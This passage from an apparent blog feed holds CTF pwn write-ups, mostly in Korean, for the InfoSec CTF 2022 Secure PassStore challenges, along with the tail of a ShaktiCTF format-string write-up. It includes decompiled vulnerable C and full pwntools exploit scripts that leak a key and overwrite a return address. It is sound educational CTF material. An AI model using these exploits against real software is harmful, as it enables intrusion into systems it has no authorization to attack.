class="line"><span class="comment"># cmd</span></span><br><span class="line"><span class="comment"># In sue_dragons() function,</span></span><br><span class="line"><span class="comment"># system(&#x27;sh&#x27;);</span></span><br></pre></td></tr></table></figure><p>I used loop bescause of offset prediction and FSB payload length.</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaktictf&#123;F0rm4T_S7r1ng5_4nd_G0T_0v3Rwr17e_4r3_7h3_r34l_k1ll3rs_4d9ddd93416dd1881ae5a725a2cb0058&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV2</title>
      <link href="/221207-infosecctf2022-secure_passstorev2/"/>
      <url>/221207-infosecctf2022-secure_passstorev2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>New! More secure! Latest version of Secure PassStoreV2! Url: 0.cloud.chals.io:15467</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îî‚îÄ‚îÄ passStoreV2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1ff9162a72b5d184e7101eae1706a6eb6b57e374, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>Î∞îÎ°ú Ï†Ñ Î¨∏Ï†úÏù∏ version 1Í≥ºÏùò Ï∞®Ïù¥Îäî ÌïòÎÇòÎã§. Î∞îÎ°ú keyÎ•º Ï∂úÎ†•ÏùÑ ÏïàÌï¥Ï§ÄÎã§Îäî Í≤É.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printfÎäî null Î∞îÏù¥Ìä∏Î•º ÎßåÎÇòÍ∏∞ Ï†ÑÍπåÏßÄ Ï∂úÎ†•ÌïúÎã§. Ïù¥Î•º Ïù¥Ïö©Ìï¥ÏÑú username Î∞îÎ°ú Îí§Ïóê Ï°¥Ïû¨ÌïòÎäî key Í∞íÏùÑ leakÌï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000004040A0 username        db 20h dup(?)           ; DATA XREF: addName(void)+18‚Üëo</span><br><span class="line">.bss:00000000004040A0                                         ; changeName(void)+18‚Üëo ...</span><br><span class="line">.bss:00000000004040C0                 public key</span><br><span class="line">.bss:00000000004040C0 key             db    ? ;               ; DATA XREF: readPass(void)+6C‚Üëo</span><br><span class="line">.bss:00000000004040C0                                         ; addPass(void)+70‚Üëo ...</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>nameÏùÑ 0x20 Î∞îÏù¥Ìä∏ ÍΩâ Ï±ÑÏõå Î≥¥ÎÇ¥Í≥† key Í∞í leak</li><li>payload ÏûëÏÑ± ÌõÑ addPass Ìï®ÏàòÏùò Î°úÏßÅ Íµ¨ÌòÑ</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">15467</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">name += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1f</span></span><br><span class="line">name += <span class="string">b&#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">key = p.recvuntil(<span class="string">&#x27;P&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40160B</span>) <span class="comment"># 0x40160a</span></span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line"></span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pas5St0r3_15_n07_600d_50lu710n_;(&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV1</title>
      <link href="/221207-infosecctf2022-secure_passstorev1/"/>
      <url>/221207-infosecctf2022-secure_passstorev1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Try to use new superpuper secure command line password storage!</p><p>url: 0.cloud.chals.io:12367</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îî‚îÄ‚îÄ passStoreV1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2349feff7fdc9215b7e1275413f61af630980a82, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Î¨∏Ï†ú ÌíÄÎã§Í∞Ä Î∞îÏù¥ÎÑàÎ¶¨Í∞Ä Î∞îÎÄåÏóàÎã§. &#x3D;„ÖÖ&#x3D; ÏõêÎûò ÌååÏù¥Í∞Ä ÏûàÏóàÎäîÎç∞ ÌååÏù¥Í∞Ä ÏÇ¨ÎùºÏ°åÎã§. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  welcome();</span><br><span class="line">  addName();</span><br><span class="line">  keyGen();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainÏùÄ Ïù¥Î†áÍ≤å ÏÉùÍ≤ºÎã§. welcome Ìï®ÏàòÎäî Î≥º Í≤å ÏóÜÏñ¥ÏÑú Í∑∏ Îã§Ïùå Ìï®ÏàòÎ∂ÄÌÑ∞ Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">addName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï†ÑÏó≠ Î≥ÄÏàò usernameÏóê 0x20 ÎßåÌÅº Ïì∏ Ïàò ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">keyGen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some preparations....&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    key[i] = rand() % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Master key prepared!\nKey: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(key);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>keyÎ•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Ïó¨Í∏∞ÏÑú fsbÍ∞Ä Î∞úÏÉùÌï† Ïàò ÏûàÏßÄÎßå.. Ïª®Ìä∏Î°§ÌïòÍ∏∞Í∞Ä ÍΩ§ ÍπåÎã§Î°úÏõåÎ≥¥Ïù∏Îã§. ÏïÑÎ¨¥Ìäº Ï∂úÎ†•Ìï¥Ï£ºÎäî keyÎ•º Îí§ÏóêÏÑú Ïñ¥ÎñªÍ≤å ÏÇ¨Ïö©Ìï†Íπå ÏÉùÍ∞ÅÌïòÎ©¥ÏÑú ÏùºÎã® ÎÑòÏñ¥Í∞ÑÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Menu: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1) Add password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2) Read password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3) Chage name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0) Exit&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> changeName();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> readPass();</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye Bye.... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        result = addPass();</span><br><span class="line">        encrypted = result;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu Ìï®ÏàòÎäî whileÏùÑ ÌÜµÌï¥ Î¨¥ÌïúÌûà Ïã§ÌñâÎêúÎã§. Ïó¨Í∏∞ÏÑú Ï£ºÎ™©Ìï¥ÏïºÌï† Í≤ÉÏù¥ 3Î≤àÎ©îÎâ¥ changeName Ìï®ÏàòÏôÄ 1Î≤à Î©îÎâ¥ addPass Ìï®ÏàòÏù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username); <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Î®ºÏ†Ä changeName Ìï®Ïàò. ÎåÄÎÜìÍ≥† fsbÍ∞Ä ÌÑ∞ÏßÑÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">addPass</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+100h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">44</span>]; <span class="comment">// [rsp+200h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+22Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src[i] = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = key[i % <span class="number">8</span>] ^ buf[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(&amp;encrypted, dest, <span class="number">0x1F</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addPass Ìï®Ïàò. dest ÌÅ¨Í∏∞Í∞Ä 44Ïù∏Îç∞ Ïó¨Í∏∞Îã§Í∞Ä 256 ÌÅ¨Í∏∞Ïùò srcÎ•º Î≥µÏÇ¨ÌïúÎã§. ÎåÄÎÜìÍ≥† bofÍ∞Ä ÌÑ∞ÏßÄÍ≥† pieÎèÑ ÏóÜÎã§. flagÎ•º Ï∂úÎ†•Ìï¥Ï£ºÎäî Ìï®ÏàòÎèÑ Ï°¥Ïû¨ÌïòÎãà Î∞îÎ°ú ÌùêÎ¶ÑÏùÑ ÎèåÎ†§Ï£ºÎ©¥ ÎêúÎã§. ÌïòÏßÄÎßå Ïù¥ Ï†ÑÏóê srcÎ•º Í∞ÄÍ≥µÌïòÎãà exploitÏùÑ ÏûëÏÑ±Ìï† Îïå Ïú†ÏùòÌï¥Ï§òÏïº ÌïúÎã§. </p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>strcpy Ìï®ÏàòÎäî Î≥µÏÇ¨Ìï† Îïå Í∏∏Ïù¥ Í≤ÄÏ¶ùÏùÑ ÌïòÏßÄ ÏïäÏïÑ bof Î∞úÏÉù Í∞ÄÎä•ÏÑ±Ïù¥ Ï°¥Ïû¨ÌïúÎã§. Ïù¥ Î¨∏Ï†úÏóêÏÑú Ïù¥Î°ú Ïù∏Ìï¥ Ìï®Ïàò ÌùêÎ¶ÑÏùÑ Î≥ÄÍ≤ΩÌï† Ïàò ÏûàÎäî Í∞ÄÎä•ÏÑ±Ïù¥ Ï°¥Ïû¨ÌïúÎã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>key Í∞í leak</li><li>payload ÏûëÏÑ± ÌõÑ addPass Ìï®ÏàòÏùò Î°úÏßÅ Íµ¨ÌòÑ</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12367</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Key: \r\n&#x27;</span>)</span><br><span class="line">key = p.recvline()[:-<span class="number">2</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;it\r\n&#x27;, str(3))</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;name:&#x27;, b&#x27;%7$p&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="comment"># e.address = int(p.recv(14), 16) - 0x1543</span></span><br><span class="line"><span class="comment"># info(hex(e.address))</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40162d</span>)</span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(buf))</span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#src[i] = key[i%8] ^ buf[i]</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line">    </span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="python3-bytes"><a href="#python3-bytes" class="headerlink" title="python3 bytes"></a>python3 bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>src = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(src)</span><br><span class="line"><span class="string">b&#x27;\x01\x02\x03&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hmmm...1_7h0u6h7_17_15_53cur3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
